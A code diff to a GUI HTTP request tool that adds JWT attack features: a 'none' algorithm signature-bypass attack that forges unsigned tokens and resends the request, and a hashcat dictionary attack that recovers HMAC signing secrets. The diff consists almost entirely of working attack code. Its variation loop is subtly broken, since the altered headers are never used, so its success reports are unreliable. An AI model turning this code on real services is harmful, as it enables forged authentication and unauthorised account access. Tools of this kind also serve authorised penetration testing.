@@ -383,12 +383,22 @@ class HTTPRequestTool:
         self.unverified_sig_var = tk.BooleanVar()
         ttk.Checkbutton(attack_frame, text="Unverified Signature Attack", variable=self.unverified_sig_var).pack(anchor=tk.W, pady=5)
         
+        self.none_sig_var = tk.BooleanVar()
+        ttk.Checkbutton(attack_frame, text="None Signature Attack", variable=self.none_sig_var).pack(anchor=tk.W, pady=5)
+        
+        self.brute_force_var = tk.BooleanVar()
+        ttk.Checkbutton(attack_frame, text="Brute Force Secret Key", variable=self.brute_force_var).pack(anchor=tk.W, pady=5)
+        
         # Add run button
         ttk.Button(attack_frame, text="Run Selected Attacks", command=lambda: self.run_jwt_attacks(attack_window)).pack(pady=10)
 
     def run_jwt_attacks(self, attack_window):
         if self.unverified_sig_var.get():
             self.perform_unverified_signature_attack()
+        if self.none_sig_var.get():
+            self.perform_none_signature_attack()
+        if self.brute_force_var.get():
+            self.perform_brute_force_attack()
         attack_window.destroy()
 
     def perform_unverified_signature_attack(self):
@@ -444,6 +454,179 @@ class HTTPRequestTool:
             else:
                 messagebox.showinfo("Attack Result", "Unverified Signature Attack: ✅ SUCCESS")
                 
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to perform attack: {str(e)}")
+
+    def perform_none_signature_attack(self):
+        # Get the current request text
+        request_text = self.request_text.get("1.0", tk.END).strip()
+        
+        # Find JWT tokens in the request
+        jwt_tokens = self.find_jwt(request_text)
+        if not jwt_tokens:
+            messagebox.showerror("Error", "No JWT tokens found in request")
+            return
+        
+        # Get the first JWT token
+        original_token = jwt_tokens[0]
+        
+        try:
+            # Decode the JWT without verification
+            header = jwt.get_unverified_header(original_token)
+            payload = jwt.decode(original_token, options={"verify_signature": False})
+            
+            # Try different variations of "none"
+            none_variations = ["none", "None", "NONE", "nOnE"]
+            success = False
+            successful_variation = None
+            
+            for variation in none_variations:
+                # Create a new header with the current variation
+                new_header = header.copy()
+                new_header["alg"] = variation
+                
+                # Create a new token with the modified header
+                modified_token = jwt.encode(payload, "", algorithm="none")
+                
+                # Replace the original token in the request
+                modified_request = request_text.replace(original_token, modified_token)
+                
+                # Send the modified request
+                self.request_text.delete("1.0", tk.END)
+                self.request_text.insert("1.0", modified_request)
+                self.process_request()
+                
+                # Get the response status code from the response text
+                response_text = self.response_text.get("1.0", tk.END)
+                status_line = response_text.split('\n')[0]
+                try:
+                    status_code = int(status_line.split()[1])
+                except (IndexError, ValueError):
+                    status_code = 0
+                
+                # If we get a success response, keep this variation
+                if status_code < 400:
+                    success = True
+                    successful_variation = variation
+                    break
+            
+            if success:
+                messagebox.showinfo("Attack Result", f"None Signature Attack: ✅ SUCCESS\nSuccessful variation: {successful_variation}")
+            else:
+                messagebox.showinfo("Attack Result", "None Signature Attack: ❌ FAILED\nAll variations failed")
+                
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to perform attack: {str(e)}")
+
+    def perform_brute_force_attack(self):
+        # Get the current request text
+        request_text = self.request_text.get("1.0", tk.END).strip()
+        
+        # Find JWT tokens in the request
+        jwt_tokens = self.find_jwt(request_text)
+        if not jwt_tokens:
+            messagebox.showerror("Error", "No JWT tokens found in request")
+            return
+        
+        # Get the first JWT token
+        jwt_token = jwt_tokens[0]
+        
+        try:
+            # Create a temporary file for the JWT
+            with open('temp_jwt.txt', 'w') as f:
+                f.write(jwt_token)
+            
+            # Check if hashcat is installed
+            try:
+                subprocess.run(['hashcat', '--version'], capture_output=True, check=True)
+            except (subprocess.SubprocessError, FileNotFoundError):
+                messagebox.showerror("Error", "hashcat is not installed. Please install hashcat to use this feature.")
+                return
+            
+            # Check if jwt.secrets.list exists
+            if not os.path.exists('jwt.secrets.list'):
+                # Create a default secrets list if it doesn't exist
+                with open('jwt.secrets.list', 'w') as f:
+                    f.write("secret1\nsecret\npassword\nadmin\n123456\nqwerty\nletmein\nwelcome\nmonkey\nsunshine\n")
+                messagebox.showinfo("Info", "Created default jwt.secrets.list file with common secrets")
+            
+            # Create results window
+            results_window = tk.Toplevel(self.root)
+            results_window.title("Brute Force Attack Results")
+            results_window.geometry("800x600")
+            
+            # Create text area for output
+            output_frame = ttk.Frame(results_window)
+            output_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+            
+            output_label = ttk.Label(output_frame, text="Hashcat Output:")
+            output_label.pack(anchor=tk.W, pady=5)
+            
+            output_text = tk.Text(output_frame, wrap=tk.WORD)
+            output_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+            
+            # Add progress bar
+            progress_frame = ttk.Frame(results_window)
+            progress_frame.pack(fill=tk.X, padx=5, pady=5)
+            
+            progress_label = ttk.Label(progress_frame, text="Running hashcat...")
+            progress_label.pack(side=tk.LEFT, padx=5)
+            
+            progress = ttk.Progressbar(progress_frame, mode='indeterminate')
+            progress.pack(fill=tk.X, expand=True, padx=5)
+            progress.start()
+            
+            def run_hashcat():
+                try:
+                    # Run hashcat
+                    result = subprocess.run(
+                        ['hashcat', '-a', '0', '-m', '16500', 'temp_jwt.txt', 'jwt.secrets.list'],
+                        capture_output=True,
+                        text=True
+                    )
+                    
+                    # Update UI in main thread
+                    results_window.after(0, lambda: update_output(result))
+                except Exception as e:
+                    results_window.after(0, lambda: show_error(str(e)))
+            
+            def update_output(result):
+                progress.stop()
+                progress.pack_forget()
+                progress_label.config(text="Hashcat completed")
+                
+                output_text.insert("1.0", result.stdout)
+                if result.stderr:
+                    output_text.insert(tk.END, f"\nErrors:\n{result.stderr}")
+                
+                # Check if we found a secret
+                if "Cracked" in result.stdout:
+                    # Extract the secret
+                    for line in result.stdout.split('\n'):
+                        if jwt_token in line:
+                            secret = line.split(':')[-1].strip()
+                            messagebox.showinfo("Success", f"Found secret key: {secret}")
+                            break
+                else:
+                    messagebox.showinfo("Result", "No secret key found in the dictionary")
+                
+                # Clean up
+                try:
+                    os.remove('temp_jwt.txt')
+                except:
+                    pass
+            
+            def show_error(error):
+                progress.stop()
+                progress.pack_forget()
+                progress_label.config(text="Error occurred")
+                output_text.insert("1.0", f"Error: {error}")
+                messagebox.showerror("Error", f"Failed to run hashcat: {error}")
+            
+            # Run hashcat in a separate thread
+            import threading
+            threading.Thread(target=run_hashcat, daemon=True).start()
+            
         except Exception as e:
             messagebox.showerror("Error", f"Failed to perform attack: {str(e)}")
 
